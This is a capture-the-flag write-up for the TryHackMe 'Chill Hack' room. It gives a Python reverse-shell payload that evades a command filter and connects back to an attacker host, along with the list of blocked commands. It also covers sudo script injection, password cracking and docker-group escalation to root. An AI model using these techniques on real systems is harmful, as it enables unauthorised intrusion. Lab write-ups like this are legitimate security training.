# THM: Chill Hack

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="../../images/write_ups/try_hack_me/chill_hack/chill_hack.png" alt="Chill Hack" width="90"/> |
| Room | Chill Hack |
| URL | https://tryhackme.com/room/chillhack |
| Difficulty | Easy |

## Concepts/Tools Used

- [ftp](../../tools/ftp.md)
- [gobuster](../../tools/gobuster.md)
- [CyberChef](https://gchq.github.io/CyberChef/)
- mysql
- [steghide](../../tools/steghide.md)
- [john](../../tools/john.md)
- docker

## Room Description

Chill the Hack out of the Machine.

Easy level CTF.  Capture the flags and have fun!

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -v -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-07 22:26 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
Initiating ARP Ping Scan at 22:26
Scanning target.thm (10.10.102.189) [1 port]
Completed ARP Ping Scan at 22:26, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:26
Scanning target.thm (10.10.102.189) [65535 ports]
Discovered open port 21/tcp on 10.10.102.189
Discovered open port 22/tcp on 10.10.102.189
Discovered open port 80/tcp on 10.10.102.189
Completed SYN Stealth Scan at 22:26, 4.28s elapsed (65535 total ports)
Initiating Service scan at 22:26
Scanning 3 services on target.thm (10.10.102.189)
Completed Service scan at 22:27, 6.10s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.102.189.
Initiating NSE at 22:27
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 22:27, 0.24s elapsed
Initiating NSE at 22:27
Completed NSE at 22:27, 0.01s elapsed
Initiating NSE at 22:27
Completed NSE at 22:27, 0.00s elapsed
Nmap scan report for target.thm (10.10.102.189)
Host is up (0.0033s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.154.250
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Game Info
MAC Address: 02:45:1A:D8:48:E7 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 22:27
Completed NSE at 22:27, 0.00s elapsed
Initiating NSE at 22:27
Completed NSE at 22:27, 0.00s elapsed
Initiating NSE at 22:27
Completed NSE at 22:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.40 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

From the output above, I see that I can log into the ftp service as the ftp user:

```bash
$ ftp target.thm
Connected to target.thm.
220 (vsFTPd 3.0.5)
Name (target.thm:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lha
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03  2020 .
drwxr-xr-x    2 0        115          4096 Oct 03  2020 ..
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt -
remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
226 Transfer complete.
90 bytes received in 0.05 secs (1.7440 kB/s)
```

I found two possible usernames, anurodh and apaar.

I went to http://target.thm and didn't find much. I tried to see if the contact form was vulnerable to a sql injection but it wasn't. Since I couldn't find anything, I ran gobuster:

```bash
$ gobuster dir -u http://target.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/images               (Status: 301) [Size: 309] [--> http://target.thm/images/]
/contact.php          (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 306] [--> http://target.thm/css/]
/js                   (Status: 301) [Size: 305] [--> http://target.thm/js/]
/fonts                (Status: 301) [Size: 308] [--> http://target.thm/fonts/]
/secret               (Status: 301) [Size: 309] [--> http://target.thm/secret/]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 830572 / 830576 (100.00%)
===============================================================
Finished
===============================================================
```

## Getting a Foothold

I notice the /secret folder. I go to http://target.thm/secret and see that there is a command input. I try whoami and it returns www-data.

I try ls and I get a screen asking if I am a hacker. I noticed tried a few command just to see if they were filtered, here are a list of commands that appear to be filtered:

- nc
- python
- bash
- php
- perl
- cat
- head
- tail
- python3
- more
- less
- sh
- ls

I noticed that if a command is piped to another command without spaces, the command doesn't get filtered. This gives me an idea to get a reverse shell.

I run the following on my attack box:

```bash
$ nc -lnvp 4444
```

On the website I send the following payload in the command input:

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attack_box_ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'|python3
```

I have a shell. I'm in!

I get a stable shell using the [guide found here](../../README.md#stable-shell).

## User Flag

I looked around a few directories including the /var/www/files directory. The index.php file in that directory has a username and password for mysql. I grabbed the records in the users tables but their passwords were not the passwords for the users on the machine.

This was a deadend but here are the commands I ran for future reference:

```bash
$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.00 sec)

mysql> use webportal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)
```

I ran my [usual list of privilege escalation commands](../../concepts/privilege_escalation.md#linux-privilege-escalation). The sudo -l command returns something interesting:

```bash
$ sudo -l
Matching Defaults entries for www-data on ip-10-10-147-116:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-147-116:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

I can run the above script as the apaar user. I view the contents of the script to see what I have to work with:

```bash
$ cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

The `$msg 2>/dev/null` is interesting. The line before that one asks for user input and then stores that input in the $msg variable. If I put a command in that variable it will try to run it and then send all errors to /dev/null.

This means I can run the .helpline.sh script with sudo as apaar and when the script asks for input on the second question I can type `/bin/bash`. The line will become `/bin/bash 2>/dev/null`. In other words, I will have shell as apaar. Here is what I ran:

```bash
$ sudo -u apaar ./.helpline.sh 

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: bill
Hello user! I am bill,  Please enter your message: /bin/bash
whoami
apaar
```

I run the following to stablize the shell:

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

I can now get the user flag:

```bash
$ cd ~
$ cat local.txt
REDACTED
```

## Root Flag

I was stumped at this point for a bit. I tried running LinPEAS but didn't get anywhere with it.

I finally went back to the /var/www/ directory. There is a files directory in that folder. In the files directory is a file called hacker.php that has these two lines:

```html
<h1 style="background-color:red;">You have reached this far. </h2>
<h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
```

I was out of ideas and so I decided to try running steghide on the images in this directory. I tried the /var/www/files/images/hacker-with-laptop_23-2147985341.jpg file first since I haven't had much success with finding hidden things in png files.

To transfer the file onto my attack box I ran the following on the target box:

```bash
$ python3 -m http.server
```

On my attack box I ran the following to download the file:

```bash
$ wget http://target.thm:8000/hacker-with-laptop_23-2147985341.jpg
```

I then tried to extract hidden files with the following command:

```bash
$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".
```

There was a hidden zip file in the jpg file. I tried to unzip the file but it wanted a password. I ran the following to get the password:

```bash
$ zip2john backup.zip > john.txt
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 type=8
$ john john.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REDACTED       (backup.zip/source_code.php)
1g 0:00:00:00 DONE (2025-07-08 18:42) 8.333g/s 102400p/s 102400c/s 102400C/s toodles..havana
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

John was able to crack the password. I unzipped the backup.zip file using the password just found:

```bash
$ unzip backup.zip 
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php
```

I viewed the contents of that file:

```bash
$ cat source_code.php
<html>
<head>
    Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
            Email: <input type="email" name="email" placeholder="email"><br><br>
            Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
        </form>
<?php
        if(isset($_POST['submit']))
    {
        $email = $_POST["email"];
        $password = $_POST["password"];
        if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
        { 
            $random = rand(1000,9999);?><br><br><br>
            <form method="POST">
                Enter the OTP: <input type="number" name="otp">
                <input type="submit" name="submitOtp" value="Submit">
            </form>
        <?php   mail($email,"OTP for authentication",$random);
            if(isset($_POST["submitOtp"]))
                {
                    $otp = $_POST["otp"];
                    if($otp == $random)
                    {
                        echo "Welcome Anurodh!";
                        header("Location: authenticated.php");
                    }
                    else
                    {
                        echo "Invalid OTP";
                    }
                }
        }
        else
        {
            echo "Invalid Username or Password";
        }
        }
?>
</html>
```

The file shows base64 password for the Anurodh user. Notice that if the password matches the user input it has hard coded "Welcome Anurodh!".

I send that base64 string to CyberChef and it cracks it. I use the password to log in as anurodh:

```bash
$ su anurodh
```

I am now anurodh. I see what groups they have:

```bash
$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

I see the docker group and start smiling. I know that I just need to start an alpine container with the root directory mounted so that I can be the root user in the docker container using the target system's file share. Here are the commands I run:

```bash
$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
$ docker images
REPOSITORY    TAG       IMAGE ID       CREATED       SIZE
alpine        latest    a24bb4013296   5 years ago   5.57MB
hello-world   latest    bf756fb1ae65   5 years ago   13.3kB
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

It worked. I'm in! The cursor changed to the # character to let me know that I am root.

I get the flag:

```bash
# cat /root/proof.txt
REDACTED
```
